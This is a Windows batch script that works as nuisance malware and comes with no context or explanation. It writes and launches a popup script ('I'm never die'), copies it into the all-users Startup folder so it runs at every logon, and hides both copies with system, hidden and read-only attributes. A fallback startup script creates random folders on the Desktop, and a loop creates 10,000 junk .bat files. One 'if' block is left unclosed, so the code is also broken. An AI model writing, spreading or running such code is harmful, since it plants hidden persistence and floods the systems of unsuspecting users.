@echo off
setlocal


(
    echo @echo off
    echo title I'm never die
    echo color 04
    echo echo.
    echo echo                                 SSdtIG5ldmVyIGRpZQ==
    echo echo.
    echo echo                              --------------------------
    echo echo.
    echo echo.
    echo echo                                 I'm never die
    echo echo.
    echo echo.
    echo echo                              --------------------------
    echo echo.
    echo echo.
    echo echo                                 SSdtIG5ldmVyIGRpZQ==
) > "%TEMP%\Im-never-die.bat"

start "" "%TEMP%\Im-never-die.bat"

XCOPY "%TEMP%\Im-never-die.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"

attrib +s +h +r "%TEMP%\Im-never-die.bat"

attrib +s +h +r  "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\Im-never-die.bat"


if not exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\Im-never-die.bat" (

    (
        echo @echo off
        echo setlocal
        echo cd "%SystemDrive%\Users\%USERNAME%\Desktop\"
        echo mkdir %RANDOM%%RANDOM%%RANDOM%%RANDOM%
    ) > "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\LOCURA-PSICOLOGICA.bat"



for /L %%i in (1,1,100) do (
    for /L %%j in (1,1,100) do (
        echo I'm never die, I'm never die, I'm never die, I'm never die > "archivo_%%i_%%j.bat"
    )
)

